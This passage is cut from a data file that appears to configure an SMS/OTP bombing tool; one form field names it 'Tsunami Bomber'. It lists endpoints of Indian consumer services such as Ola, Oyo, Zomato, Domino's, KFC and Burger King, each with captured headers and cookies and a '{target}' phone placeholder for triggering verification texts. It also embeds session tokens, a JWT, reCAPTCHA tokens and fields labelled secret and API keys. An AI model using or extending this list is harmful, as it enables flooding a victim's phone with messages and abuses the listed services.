ak_bmsc=CEAADF4288BCF11000CCB857AACE172E312C8DD4063900006952995F9AE7425D~plocqnTjE8cA1UCnji3Iq2NSbY1TlDRS8GbpKYzYXN7+Zt0tH9LY1NltyfjaZhBvwoj3OAtYp9ehHi0gUJUctXr9b8mu0M8Cqt8vfBcAomTxwsglrGu6Zy2D9m4ItJhPvPH8LvduQoR4nLbtSeGZZFmhYCy+RdMUvrbHzZD1vvTQEH7SOGjc/U6IkFa1HBYIdv5XjZ6eK7ihBjxWpjC0HSnympSSx3Cz35mKjQScBOXT8qFJ/g8/+AcmiNtyWn+aD4nDoOtBbdzO92QTD1yv8Sbg==; _gcl_au=1.1.373807621.1603883626; pokusCached=78a1c8959dfd54a3a69e965db4d4da6a3c0a1097; htlVer=1; fltVer=2; npwah=true; dvid=a3d2f892-af4d-40d1-808a-db6286b8fe1f; ccde=IN; bm_sz=8FFF4F9C8A322ED4914209E8181B1D7F~YAAQ1I0sMRLUOF51AQAARO3pbgmJT+1zmwKJs3TfxPV+kweFcHWgWFauhszrF6NDaeLmW2Yd4MVklBIbygarp94vmeRIzOUaQ3z94CkPrk74kcDh06j1VlqamLjLkI+QylO7DqkdyQAOX3TIQ8z3qEfh6VEoRm0ova+DbVvewNUb9IZpa5T0XQfTCMV9dEnVpZdpug=="}, "json": {"loginId": "{target}", "type": "MOBILE", "version": 2, "countryCode": "91"}},
    {"name": "XB_Ola", "url": "https://accounts.olacabs.com/api/login", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"x-fingerprint-id": "3664542227", "csrf-token": "v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://accounts.olacabs.com", "referer": "https://accounts.olacabs.com/?serviceType=p2p&when=NOW&utm_source=widget_on_olacabs&pickup_name=Current%20Location&drop_lat=26.7729751&drop_lng=82.1457934&drop_name=Faizabad,%20Uttar%20Pradesh%20India&pickup=&lat=26.7705619&lng=82.151815&cid=687045355.1603884269", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "_gat=1; XSRF-TOKEN=v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I; _csrf=OBHlYhT8CZfAjUv8sp7YTWD4; OSRN_v1=WAVlPOqlGgDrpQZWrwT_V0yT; _gid=GA1.2.788616267.1603884269; _ga=GA1.2.687045355.1603884269"}, "json": {"mobileNumber": "{target}", "dialingCode": "+91", "countryCode": "IN", "headers": {}, "verificationId": null, "captchaInfo": {"gcaptcha": "03AGdBq26mRWBEeBGcFIqhyewjUTfv-Cl4msB5OR3-1NN-IS9kKj3JDAR6MxB0rvNMfhCRqxJccxbUSndGyJvojv2ohDgNe2q8683oSNoD624E20bLqeo6ViMHsgogMvgSmKQUlummiZfr3MUM39UW0T8yJkG1OAEO9-HWTK-wZkEG7bgpxoGFrh1Cw4WwIGPnVZ4-pmulwlAbDCqsgqahK9ngTb8S-EPZu7tFR1srJDE8nF4WhHUR8qsLR1ijem1sNsrdi2-_IihHp3GZqisH1Izt-dmuGW-zSYWyHmZ5EtNcZEk4iA0rxlPpru-n0fxN8RjAH7z4dJJ3vhish9hcyhYYSriKYmiFZzrwO1T72BQrXyx8Xk_zf6YnHwzZms-NEdojlOt87D-t45Fm31IXnTBcTM1-TXZmKCoia6k1kGZmk1arWUMNuSq0SNMh6g42XZ59_I14q_qhM9qF7lMNaSbYOaRQnjlLkA", "fingerPrint": 3664542227, "storageId": "16038843100270vLePjUljyT3B4eOO8Qvp0VNZ5l"}}},
    {"name": "XB_EasyMyTrip", "url": "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "text/plain, */*; q=0.01", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json; charset=UTF-8", "origin": "https://mybookings.easemytrip.com", "referer": "https://mybookings.easemytrip.com/MyBooking/Profile", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "__stbpnenable=1; __stgeo=\"0\"; __stdf=0; __stp={\"visit\":\"new\",\"uuid\":\"714d955e-c9df-48b4-9853-a750c4edcf9e\"}; __sts={\"sid\":1603884684538,\"tx\":1603884684538,\"url\":\"https%3A%2F%2Fmybookings.easemytrip.com%2FMyBooking%2FProfile\",\"pet\":1603884684538,\"set\":1603884684538}; G_ENABLED_IDPS=google; _fbp=fb.1.1603884682032.457003053; _gat_UA-12090546-1=1; _gac_UA-12090546-1=1.1603884681.Cj0KCQjwreT8BRDTARIsAJLI0KI5aOU5tsFkXp8bvDpCv9NB8crUEHbEWsOhpW6RhqudUYcsMzWfN1waAiMKEALw_wcB; _gid=GA1.2.2094904679.1603884681; _ga=GA1.2.1719065224.1603884681; _gcl_au=1.1.99797182.1603884681; _gcl_aw=GCL.1603884681.Cj0KCQjwreT8BRDTARIsAJLI0KI5aOU5tsFkXp8bvDpCv9NB8crUEHbEWsOhpW6RhqudUYcsMzWfN1waAiMKEALw_wcB; __auc=7870b1471756efa07a40cd4466a; __asc=7870b1471756efa07a40cd4466a; _uetvid=1a44f9b0191111eb9e83c9c023ddc55d; _uetsid=1a43e630191111ebaef7a5a12cec5701; CusId=20201028170123; ReferalCookie=Cj0KCQjwreT8BRDTARIsAJLI0KI5aOU5tsFkXp8bvDpCv9NB8crUEHbEWsOhpW6RhqudUYcsMzWfN1waAiMKEALw_wcB|||||https://www.google.com/"}, "json": {"emailph": "{target}"}},
    {"name": "XB_Oyo_1", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"xsrf-token": "vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "text/plain;charset=UTF-8", "accept": "*/*", "origin": "https://www.oyorooms.com", "referer": "https://www.oyorooms.com/login", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "bm_sv=66091572F1C84E492CD7D5BEE66695B4~Rl7m9C2L9WRjsYnrvpkefKGZT71sO2cjJZ3UhuDxLmuUjPMapnEY4NCRodCAigmjoGuy7hDnrb0LRLTvSYa0mbGlL/KzbcWbXn9XS8f/auJEWdq7B8cWRp4i9gxP9eX3k0dWncylAUuTfZwfIhjO+cBdof04R4Sglu5ioZ+BkWg=; _gat=1; cto_bundle=G4RwDF9uQVJFR0l6ck03aGJiODZUNEJaNnl2bzFaWmQ1djZSNmhWUGQwSDd2NFJ2ZUQ1ODVVTW9NcUd0cGxxcjlETXBEVDVFZ2p4YVVycTBzT3V3Nm85RyUyRnd6aEoySElTckRlcmpjUVJhYmlHcXJjNHNBOTd4cE56TGlqcEJ1b0tnZFFodkpod0lnYkZhNVhvdk5pZlJkTUFZZyUzRCUzRA; moe_uuid=d9b15c19-958d-4838-a4d8-0e6313f6a899; _gid=GA1.2.578005218.1603884914; _ga=GA1.2.289841050.1603884914; AMP_TOKEN=%24NOT_FOUND; _fbp=fb.1.1603884913496.917081192; tvc_utm_content=(not set); tvc_utm_key=(not set); tvc_utm_campaign=(not set); tvc_utm_medium=organic; tvc_utm_source=google; _gcl_au=1.1.933447383.1603884913; fingerprint2=d4f670396357a34731ad7e9b3ea2be0c; ak_bmsc=98A5361D28FD26A3BFC0784CA4BDAF82312C8DAF685F00006C57995F645EE85A~plep5nNWeUrjqcBoIzjb1evyq2vpGST4++LqieM9AmzCG43w0pDKwnXucM2naUNESgIzGZk6GrsBiWS4bl1bJNvowIfaIfm2F0zDytJn1BbhM00Gq7RS7EBCSVosgcZQjsgb0ErmKbfqHzD+rvclsQzKvtbVYgI4nSuxP7fIP7PXg2Q8n86u2C2iENRy3/eUCDCpDY4ImvjAGyI2kaJgOfyjkcJwXItSImvy2kSe4eRHBCSVp88WS+YBvt1g/Kw2Vpc+zJxLP8Qj2yDSswwqvQSg==; isHomepageViewed=true; XSRF-TOKEN=vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0; _uid=Not%20logged%20in; token=SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; expd=mww2%3A1%7CBnTc%3A0%7Cnear%3A0%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A1%7Cpwbs%3A1%7Cmwsb%3A0%7Cslin%3A1%7Chsdm%3A2%7Clpex%3A1%7Clphv%3A0%7Cdpcv%3A0%7Cgmab%3A0%7Curhe%3A0%7Cprdp%3A1%7Ccomp%3A1%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cwboi%3A1%7Csst%3A1%7Ctxwb%3A1%7Cpod2%3A1%7Clnhd%3A1%7Cppsi%3A0%7Cgcer%3A0%7Crecs%3A1%7Clvhm%3A0%7Cgmbr%3A0%7Cyolo%3A0%7Crcta%3A0; _csrf=fX6oskHhiVSy9V0SQqOspeoe; mab=2e11992dc4c54dd59fe36360f6447c97; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DHR%2Ccity%3DAMBALA%2Clat%3D30.38%2Clong%3D76.78%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D55836%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; acc=IN"}, "json": {"phone": "{target}", "country_code": "+91", "nod": 4}},
    {"name": "XB_BookMyShow_2", "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "origin": "https://in.bookmyshow.com", "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={phone}&email=&source=web", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "G_ENABLED_IDPS=google; _uetvid=304ac2c0191211ebb4d2cbc446845671; _uetsid=30481cb0191211ebac307b72fd063244; WZRK_S_RK4-47R-98KZ=%7B%22p%22%3A2%2C%22s%22%3A1603885148%2C%22t%22%3A1603885159%7D; sessionId=1603885159122; __cfruid=349d4cbcb4077b53c92af99cd2a8ea17832e3c5d-1603885151; rgn=%7B%22regionCode%22%3A%22ABOR%22%2C%22regionName%22%3A%22Abohar%22%2C%22subCode%22%3A%22%22%2C%22subName%22%3A%22%22%2C%22regionNameSlug%22%3A%22abohar%22%2C%22regionCodeSlug%22%3A%22abor%22%2C%22Lat%22%3A%2230.1453%22%2C%22Long%22%3A%2274.1993%22%7D; overrideArea=%22true%22; userNotified=false; _gat_UA-27207583-8=1; tvc_bmscookie_gid=GA1.2.1463184875.1603885148; tvc_bmscookie=GA1.2.323425446.1603885148; AMP_TOKEN=%24NOT_FOUND; _fbp=fb.1.1603885147662.1946366717; WZRK_G=0cf00ce388574ff6ba9d04426bc06a73; _gcl_au=1.1.1582607514.1603885145; preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D; bmsId=1.613310084.1603885142414; __cfduid=d7a425d4143ee46199b515af6a6b0c8581603885142"}, "json": {"channel": "phone", "subChannel": "sms", "details": {"phone": "{target}", "origin": "https://in.bookmyshow.com"}}},
    {"name": "XB_Zomato_2", "url": "https://www.zomato.com/webroutes/auth/login", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"x-zomato-csrft": "74a094f89ea708a8f3b78c9a6df38349", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://www.zomato.com", "referer": "https://www.zomato.com/kanpur", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "g_state={\"i_p\":1603892852968,\"i_l\":1}; AWSALBTGCORS=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV; AWSALBTG=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV; _uetvid=4f6b1b10191311ebb65cabc7eb49e843; _uetsid=4f69c050191311eba1032d186f404b1a; G_ENABLED_IDPS=google; _fbp=fb.1.1603885628996.1156015945; _gat_country=1; _gat_city=1; _gat_global=1; _gcl_au=1.1.1605422707.1603885626; _gid=GA1.2.1616354908.1603885626; _ga=GA1.2.1373047799.1603885626; locus=%7B%22addressId%22%3A0%2C%22lat%22%3A26.4607%2C%22lng%22%3A80.3334%2C%22cityId%22%3A23%2C%22ltv%22%3A23%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A15750%2C%22fen%22%3A%22Kanpur%22%7D; lty=city; ltv=23; ak_bmsc=D218CC214FA71C400C71BCF2A3F35579B855DCCF7E2E0000385A995FC9E77F4B~plAF7CBZ4PUj3czKvHvfBmp17I7Gj84YwU/0/+iZ5dRIj4xWHOwmKUWPdyTqKBKi3TE3lM8CxyfsMzbyYuRmFcpDpfOCdd4K430P5HBMYUsQw6Q2mFqX2Sa9XmIq1UHabDzo9aakYe1BEM/3nLCDxoeuEVJ71uQ2Njm/dq/49iGxDmhDChYPLpOeyxqL2CKhK9QR0dzFme5AYD0/RDjh81kY7WBkfgnz5NoX1N+t69fQA=; csrf=74a094f89ea708a8f3b78c9a6df38349; PHPSESSID=de653951716ab490d5639700c776d524; fbtrack=4f77e94d432d648e26273c38b002b7e3; zl=en; fbcity=23"}, "json": {"country_id": 1, "phone": "{target}", "verification_type": "sms", "method": "phone"}},
    {"name": "XB_Dominos", "url": "https://api.dominos.co.in/loginhandler/forgotpassword", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"strict-transport-security": "max-age=1636116872593", "access-control-allow-methods": "GET, POST, PATCH, PUT, DELETE, OPTIONS", "x-content-type-options": "nosniff", "api_key": "d2aeb489bb8df385", "ga_client_id": "559252815.1604559839", "status": "SUCCESS", "secretkey": "dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp", "userid": "48747cab-a7b9-4dc9-b8dc-eabbb9883d72", "x-forwarded-for-requestid": "1604559920579-48747cab-a7b9-4dc9-b8dc-eabbb9883d72", "cartid": "1823648622264698", "source": "PWA18#upsellC", "isloggedin": "false", "client_type": "web app-chrome", "accesskeyid": "ASIAWMIT2NXASDYLBK5W1604559840", "x-frame-options": "mitigate", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "credentials": "[object Object]", "deliverytype": "D", "authtoken": "ASIAWMIT2NXASDYLBK5W1604559840", "access-control-allow-origin": "", "accept": "application/json, text/plain, */", "sessiontoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDQ1NjEwNDAsInVzZXJJZCI6IjQ4NzQ3Y2FiLWE3YjktNGRjOS1iOGRjLWVhYmJiOTg4M2Q3MiJ9.X59BK5JPeEwBfA0J3IRgN23BgYIfFW_la_ZfNHLn0C8", "content-type": "application/json", "access-control-allow-headers": "*", "storeid": "6585R", "ab_test_variant": "New Flow", "origin": "https://m.dominos.co.in", "referer": "https://m.dominos.co.in/", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"lastName": "", "mobile": "{target}", "firstName": ""}},
    {"name": "XB_PizzaHut", "url": "https://api.pizzahut.io/v1/otp/generate", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"x-trace-id": "f222f460-946d-4c59-bb9e-e87db924399c", "x-environment-flag": "production", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "recaptcha-token": "03AGdBq25_PaOvx0wAkF3F42ZlMFOK_MV_jF_Q02EKNfJN8lM1f5HSf9d4yxlWDX0Le16IU8rhHV_IUx_CkclsYMviCYTWbvdiiiaUjzTCt52xgED29gx9PW5i0enDH01ne5h3-7hE5d1XFUDaNz33HvJHsupCC1fkOXCHRmkVDOIrKrP-ucgZk8QOOtAgIfe8PJ5JkPH1eLdKVyJb5Sd3lYd8zPZUim1pt59CqOeuK_YD4PQVMt1vBoazROTGEFBfqapC40sBHBK-EbG3CjOCc3y9f7jVinXG8MZ8nhEbfUwqE4b5bGVaV3UAe3isB441XwKqYxVibHbPQwY90oq5O5o1aGB2i6aN7AUo2o5zUYA1uRIVdFZuKlZ7G2k4QusN9seS6HqHv3xESCH-C8Zk3L9QOYiO6pczr9YnkKPX8jl1lt2z4YiTRuyz1oVCFFD8qd8YFj2LMPKqgLNr8DGBPpbLtQhwArKtzQ", "content-type": "application/json; charset=utf-8", "accept": "/", "origin": "https://www.pizzahut.co.in", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"phone": "+91+91{target}"}},
    {"name": "XB_KFC", "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/plain, /", "__requestverificationtoken": "x4nkEUgK8ry30gyy-VfQiKwfxseHkYTZKSPIpJHHlL-XhI5qidMgytvqfMZQsnrTBUVN3nwjxfkI70h7NsrayLrZYPH3voJRiGqlvga3w4U1:gCgZsKH5NNJvB6KvrR3oFpE5mADmB1LbVgWsjUpzeWB9ciFioAJphnNwbb4J_wlGLz1-gFLxPsXqOC6EdFC0aUgBW3Yw6JgX0E4zxTsvHK81", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json;charset=UTF-8", "origin": "https://online.kfc.co.in", "referer": "https://online.kfc.co.in/login", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "AWSALBCORS=MeqABDSeOyrESZIiOztr+/dF2jLY1lkvK/lkcXOvFnhiQE175smiXPicimckBVoNVVsLYORg6pCeywKiRTWMEBWbvx6yuaue6opXNERoCV1DWLQY36Eeg8SArhQp; AWSALB=MeqABDSeOyrESZIiOztr+/dF2jLY1lkvK/lkcXOvFnhiQE175smiXPicimckBVoNVVsLYORg6pCeywKiRTWMEBWbvx6yuaue6opXNERoCV1DWLQY36Eeg8SArhQp; bm_sv=53C041FCCE2D6FD3321A79351020FAEE~j7cP9L6VSQPYRsbqLGwt8RzkCA7V09u+MYoqGjWndCnTL4j208Z54azeQUSPERX7dHmnfetoe8Blit8FcvWB+lLO0Gio3JdGnOK81vxniNzaz/6Czf75vPN75p3DpRRdLJZVk7M3y6fx6tdmSpXyoBG7KiNxW+q5BbuJE3qcazw=; _uetvid=13d96d501f3611eb9d18c9a8fb16b76e; _uetsid=13d701c01f3611eb9030050f6efd80a0; cto_bundle=v6U7KV9RV1NKVWtoSEtBdDMya1dZTlc4b2M2dzQzM0MlMkZ1T2VoRnhDWEh1eDJ1N0k1OERVQ2lldWhsbFBMckpQeGRNdUZURmdZM0FDa3VmckJnaXdKOUJpOEpWSzQlMkZuMldDMVJkNVpnWXJmUmt1dkZSYW1wSXRvWUkzVjY5RHZXVyUyRkFGVVNJJTJGRUtZNzglMkI5NXBvcFBpOFppVmNnJTNEJTNE; _gat_UA-39424837-1=1; _fbp=fb.2.1604560269277.677327095; _gid=GA1.3.377892622.1604560269; _ga=GA1.3.414417970.1604560269; _gcl_au=1.1.1092294754.1604560267; ak_bmsc=860EE33AEA9A8D4CE7CD119FB1EC9729173A5D44517B000088A5A35F5D2C630E~plrfzJjarBUPpvI/sB4VDBhfhmuvZmyIdTSmfJO51YDwdxrYhO0dYKeemjEYuml7EVEmBBdQHQH6HS9LQu4ykNnTUlBRrT6uVYBR7TpoT6tdxQeizvLILFLVbF5pTz7NTBq5WZOF6g9erOVAkhbUIbwYYz4iCzqJCl2Wo1ylX8ymzBU6aGw/kZg4pdvpcnJUSSukS06r35CrtmMWdb97+iPdRAdyMWIEJbjdgxbSjv4d+TygRxNTcW6i2u4YdYMh2K0ecaobDsPHqhZw8158pNpw==; bm_mi=10E2246CA83B5612391BF358428BA8FF~a4AjJ6XvWPiCIqFnU4fyEM78uMiZ4SlzvPaSmlVSrOb+W72E6X9ohJm7wc2y1PLh74Iy2fUNtO+abymSudnyymsw19y9ObFoESGl0lqkXYd9MV3Ee1GWTgw0PtiiEsNTA3PF5Kn6Ch7sQWs+8uE+cToMSn2/QGSD6uT134pquP2Dz08bhPW3MgdTwFfp6+hkHftBKJFUSshzbqRDgERqde8PyHPHj4Njzgor9fND94EQrXchiz1L1ySYsHiSaaDf/qCLVJF0yXYg9Z33xk/ifAQ7cFDtvj2jCDnueLCplvM=; KFCI.A.SID_o=low4l2ltqydlp2mwtosdmg5k; KFCI.A.SID=low4l2ltqydlp2mwtosdmg5k; KFCI.IMS=False; KFCI.LC=en-US; KFCI.ReMe=False; KFCI.CHNL=All; KFCI.IPO=False; KFCI.ASD=False; KFCI.OM=None"}, "json": {"phoneNumber": "{target}", "AuthorizedFor": "3", "Resend": "false"}},
    {"name": "XB_BurgerKing", "url": "https://consumer-apis.burgerking.in/api/v1/user/signUp", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"appversion": "1.6", "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6IlRFTVA2OTIyMjg1MjcxNjA0NTYxMTc2IiwiZXhwIjoxNjA0NTYxMjM2fQ.GU9L_HlIAZEQqfxi2nK0o2VGW8Y1L1JS8giVDn85F70", "content-type": "application/json", "access-control-allow-origin": "", "accept": "application/json, text/plain, */", "timestamp": "1604561218463", "userid": "TEMP6922285271604561176", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "platform": "web", "type": "dinein", "encryptionkey": "39c9c62a58dc93a3787b7dc7727b289b7583b678d44fc2c17e2887150a11db38", "origin": "https://www.burgerking.in", "referer": "https://www.burgerking.in/", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"phone_no": "{target}"}},
    {"name": "XB_Dineout", "url": "https://www.dineout.co.in/xhrajaxrequest/user_signup", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/javascript, /; q=0.01", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.dineout.co.in", "referer": "https://www.dineout.co.in/non-veg-special-restaurants-near-me", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "pwa=0; WZRK_S_48K-44K-5R5Z=%7B%22p%22%3A1%2C%22s%22%3A1604561879%2C%22t%22%3A1604561879%7D; WZRK_G=c0a4edbd231e4af5975c7c0013b03754; gaClientId=403939189.1604561878; _gat=1; G_ENABLED_IDPS=google; _fbp=fb.2.1604561878472.1759911387; _col_uuid=23b8f026-f1d4-42ee-9431-9ddae2926e46-62no; _gid=GA1.3.529280843.1604561878; _ga=GA1.3.403939189.1604561878; firstUser=2; connect.sid=s%3ANQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R.wov1d5tZLKCYTQMvAeauuc9FMD6qiPP4qXZPvZHjXj8; city_id=0; city_name=Delhi; firstVisit=1; countly_webapp_uid=NQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R"}, "json": {"_raw": "name=Tsunami+Bomber&email=tsunami%40gmail.com&phone={target}"}},
    {"name": "XB_Oyo_2", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"xsrf-token": "boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "text/plain;charset=UTF-8", "accept": "/", "origin": "https://www.oyorooms.com", "referer": "https://www.oyorooms.com/login", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "bm_sv=51FB5B26188E3B1A010377CA066F396A~CdOf94m28FvrgJlHsOMLxibMoTRC6EFtC5/w4xrbhmR4D0PcjfY9g2ihtdKEB4OHQqnE2Jjbp7KppArQqMLTuh+CeqTXDufQJWSEKy1TuQT4rsT/uvtN+faeGA8IknJCYpnCGnu6xc7xWjjXStxNJ5so+CPy/9VEGNXKBijJ73A=; cto_bundle=dW5EdV9uQVJFR0l6ck03aGJiODZUNEJaNnlvSTZnSWZyN2Z5UTIyYnVMOERvMGhVRjBLVnR1TGE2TzRPczZEYXpsJTJGTkVQeFFHV0F5Z3B0anA3WXhGV0U0d1BObVdFOWZZZmxtJTJGYjJUSTZ6VnBzSUpneGp1cmJXQk1GclUlMkZPWHY0SUlrNFhmVWVpUU5DM0RpaCUyQmVWRG8lMkJURHRnJTNEJTNE; isHomepageViewed=true; XSRF-TOKEN=boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk; expd=mww2%3A1%7CBnTc%3A0%7Cnear%3A0%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A1%7Cpwbs%3A1%7Cmwsb%3A0%7Cslin%3A1%7Chsdm%3A2%7Clpex%3A1%7Clphv%3A0%7Cdpcv%3A0%7Cgmab%3A0%7Curhe%3A0%7Cprdp%3A1%7Ccomp%3A1%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cwboi%3A1%7Csst%3A1%7Ctxwb%3A1%7Cpod2%3A1%7Clnhd%3A1%7Cppsi%3A0%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A0%7Clvhm%3A0%7Cgmbr%3A0%7Cyolo%3A0%7Crcta%3A0; moe_uuid=d9b15c19-958d-4838-a4d8-0e6313f6a899; _gat=1; _gid=GA1.2.699494446.1604562049; _ga=GA1.2.amp-tFq7fxKPkXNa-cpIDmePQBTOwAeIzBBnke122oC9lel3Qtmxqes1NIPJmeZgfdPf; AMP_TOKEN=AHTRwNPhj7EtxJyD_RuBPs0ZuKIjp3o66t2xkKdQ5e3etnndiGTnnnnQ_AubASePzWJrB0U9UG1kI8wAwUavSq4w; ak_bmsc=0C93250BD2DE35694F06122DB2E120D2173A5D9DAD03000075ACA35FE266D14F~plySTVe+pT2eOrbJN47u/7i+QwcW0RcnGWTJz6IJ0GQQVUl1MO9HBlgBFSOEw7ao237yJL+waqU3yDA7Jm+KjV4ekkL8Dt2uiMmfcnOp5EIdpmDl6M0mh2hknzbcuwESX4baJYGwNMQknsOdvsW9gm8t3gyXg1dUHALioONwH94dicpzxiMVpJOeFXIeodlgSmz1W5PZMOXVsESZMqDQG1oWejFGAWxv15uNJ7XGBOHpHHfMu+AP7s++/owSlZgpvOec+17LzcnFiONwLWS53X1Q==; bm_mi=572BF703EB3A8A3CCE6E5FD82C29C478~51QSzfNmDn5IBhYqDJrzVU3WLdDQOteJiUPFoVQzy6NZNTnU1F7cPWvTpHcAkbvjhkg3RolB8h/HSpaiGGjWv70EjySjqm29iAcceWKMAHFnNKIDOwquTXIkWJaGRnVARK4t/XWBuPOctTVN8zyBpYjQFaN43JKN0ZPtxlAIUJWn16nQxpCePxcya77BAObWGX0fNvVpVhhL+YFu921bU4HaJeMF2XXwditZEPfZk1/d1g9XNrcgT42oEcIxATz1SY3VB8wGazeROpsY0sd8gR3gl4IJZmOMK4sy0L+3rfM=; ql=false; _uid=Not%20logged%20in; _csrf=m7_2j5oJ99S-vPQepeMS7NuS; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DUP%2Ccity%3DNOIDA%2Clat%3D28.57%2Clong%3D77.32%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D45609%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; acc=IN; connect.sid=s%3AyIOWYcRpe2dpqYe6TkC2AP5LpxUGjTuO.tGRFa%2B%2BrE%2F5l51ClfuEVJ6kPoE4KoCaIUFvzRzVHZ7c; _fbp=fb.1.1603884913496.917081192; tvc_utm_content=(not set); tvc_utm_key=(not set); tvc_utm_campaign=(not set); tvc_utm_medium=organic; tvc_utm_source=google; _gcl_au=1.1.933447383.1603884913; fingerprint2=d4f670396357a34731ad7e9b3ea2be0c; token=SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D; 